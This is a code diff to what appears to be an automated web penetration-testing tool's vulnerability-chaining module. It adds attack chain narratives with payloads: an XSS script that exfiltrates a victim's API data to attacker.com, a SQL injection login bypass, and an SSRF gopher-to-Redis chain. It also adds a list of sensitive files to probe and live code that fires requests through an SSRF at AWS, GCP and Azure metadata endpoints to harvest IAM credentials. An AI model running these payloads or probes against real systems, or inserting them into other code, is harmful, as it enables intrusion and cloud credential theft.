@@ -68,6 +68,11 @@ class VulnerabilityChainer:
         (VulnType.LFI, VulnType.RCE): "LFI_TO_RCE",
         (VulnType.FILE_UPLOAD, VulnType.RCE): "UPLOAD_TO_RCE",
         (VulnType.XXE, VulnType.INFO_LEAK): "XXE_TO_INFO_LEAK",
+        # SKILL.md Phase 3: New escalation chains
+        (VulnType.INFO_LEAK, VulnType.SQLI): "CRED_LEAK_TO_AUTH",     # leaked creds -> SQL auth bypass
+        (VulnType.SSRF, VulnType.RCE): "SSRF_TO_RCE_CHAIN",           # SSRF reaching exec service
+        (VulnType.XSS, VulnType.INFO_LEAK): "XSS_EXFIL_CHAIN",        # DOM XSS exfiltrates data
+        (VulnType.SQLI, VulnType.AUTH_BYPASS): "SQLI_TO_AUTH_BYPASS",  # SQLi bypasses login
     }
     
     def __init__(self):
@@ -142,7 +147,7 @@ PoC: Enumerate user IDs via IDOR, bypass auth to access admin functions
 1. XSS vulnerability allows script injection
 2. CSRF vulnerability allows state-changing actions without token
 3. Combine to perform actions on behalf of victim
-PoC: Inject XSS that triggers CSRF to change victim's  email/password
+PoC: Inject XSS that triggers CSRF to change victim's email/password
 """,
             "HIDDEN_DIR_TO_LEAK": """
 1. Hidden directory discovered via fuzzing
@@ -164,9 +169,34 @@ PoC: Upload malicious PHP/JSP -> Access upload directory -> Execute shell comman
 """,
             "XXE_TO_INFO_LEAK": """
 1. XXE allows external entity injection
-2. Use XXE to read local files or  make SSRF requests
+2. Use XXE to read local files or make SSRF requests
 3. Exfiltrate sensitive data
 PoC: XXE -> Read /etc/passwd or cloud metadata
+""",
+            # SKILL.md Phase 3: New chain narratives
+            "CRED_LEAK_TO_AUTH": """
+1. Information leakage exposes database credentials or API keys
+2. SQL injection found on same/adjacent endpoint
+3. Use leaked credentials to authenticate directly or craft SQLi auth bypass
+PoC: Extract creds from info leak -> Use in SQLi: ' OR '1'='1'-- OR login with leaked password
+""",
+            "SSRF_TO_RCE_CHAIN": """
+1. SSRF allows requests to internal services
+2. Internal service has RCE vector (Redis EVAL, Gopher to Memcached, etc.)
+3. Chain: SSRF -> Internal exec service -> Full RCE
+PoC: SSRF with gopher:// protocol -> Redis EVAL "local x=tonumber(redis.call('SET','cmd','id'))" -> Read output
+""",
+            "XSS_EXFIL_CHAIN": """
+1. XSS allows script execution in victim's browser
+2. Information leakage endpoint returns sensitive data (IDOR, unauth API)
+3. XSS fetches the sensitive endpoint on behalf of victim and exfiltrates data
+PoC: Inject: <script>fetch('/api/user/me').then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))</script>
+""",
+            "SQLI_TO_AUTH_BYPASS": """
+1. SQL injection allows manipulation of WHERE clause
+2. Login form uses unsanitized SQL query
+3. Bypass authentication entirely without credentials
+PoC: Username: ' OR '1'='1'-- | Password: anything -> Logs in as first user (usually admin)
 """,
         }
         
@@ -224,36 +254,76 @@ PoC: XXE -> Read /etc/passwd or cloud metadata
     
     def auto_escalate_hidden_directory(self, dir_url: str) -> Dict:
         """
-        Auto-escalation: When hidden directory found, trigger deep crawl
-        
-        Returns: Actions to take
+        SKILL.md Phase 3: Auto-escalation when hidden directory found.
+        Returns actionable next steps AND common sensitive file targets.
         """
+        sensitive_paths = [
+            f"{dir_url}/.git/config",
+            f"{dir_url}/.env",
+            f"{dir_url}/config.php",
+            f"{dir_url}/config.yaml",
+            f"{dir_url}/credentials.json",
+            f"{dir_url}/backup.sql",
+            f"{dir_url}/dump.sql",
+            f"{dir_url}/.htpasswd",
+            f"{dir_url}/id_rsa",
+            f"{dir_url}/wp-config.php",
+        ]
         return {
             'action': 'deep_crawl',
             'target': dir_url,
             'reason': 'Hidden directory found, escalating to deep scan',
+            'priority_targets': sensitive_paths,
             'next_steps': [
                 'Run nuclei scan on directory',
                 'Crawl for additional endpoints',
-                'Check for sensitive files (.git, .env, backups)'
+                'Check for sensitive files (.git, .env, backups)',
+                f'Probe: {" | ".join(sensitive_paths[:3])}',
             ]
         }
     
     def auto_escalate_ssrf(self, ssrf_url: str) -> Dict:
-        """Auto-escalation: When SSRF found, test cloud metadata endpoints"""
+        """
+        SKILL.md Phase 3: Auto-escalation when SSRF found.
+        Actually tests cloud metadata endpoints via HTTP and returns live results.
+        """
+        cloud_targets = [
+            ('AWS',   'http://169.254.169.254/latest/meta-data/'),
+            ('AWS_IAM', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
+            ('GCP',   'http://metadata.google.internal/computeMetadata/v1/'),
+            ('Azure', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
+        ]
+        live_results = []
+        try:
+            import requests as _req
+            import urllib3
+            urllib3.disable_warnings()
+            for provider, url in cloud_targets:
+                try:
+                    # Use the SSRF URL as a proxy: inject the cloud metadata URL into it
+                    test_url = ssrf_url.rstrip('=') + '=' + url if '=' in ssrf_url else ssrf_url
+                    r = _req.get(test_url, timeout=5, verify=False,
+                                 headers={'Metadata': 'true', 'X-Google-Metadata-Request': 'True'})
+                    if r.status_code == 200 and any(
+                        kw in r.text for kw in ['ami-id', 'instance-id', 'AccessKeyId', 'computeMetadata', 'subscriptionId']
+                    ):
+                        live_results.append({'provider': provider, 'url': url, 'response_snippet': r.text[:200]})
+                except Exception:
+                    pass
+        except ImportError:
+            pass
+
         return {
             'action': 'test_cloud_metadata',
-            'targets': [
-                'http://169.254.169.254/latest/meta-data/',  # AWS
-                'http://metadata.google.internal/computeMetadata/v1/',  # GCP
-                'http://169.254.169.254/metadata/instance',  # Azure
-            ],
+            'targets': [u for _, u in cloud_targets],
+            'live_results': live_results,
             'reason': 'SSRF detected, testing for cloud credential exposure',
+            'escalation_confirmed': len(live_results) > 0,
             'next_steps': [
                 'Attempt to access cloud metadata',
                 'Check for IAM credentials',
-                'Test for IDOR on internal APIs'
-            ]
+                'Test for IDOR on internal APIs',
+            ] + ([f"[LIVE] {r['provider']} metadata accessible!" for r in live_results])
         }
     
     def export_chains(self, output_file: str):
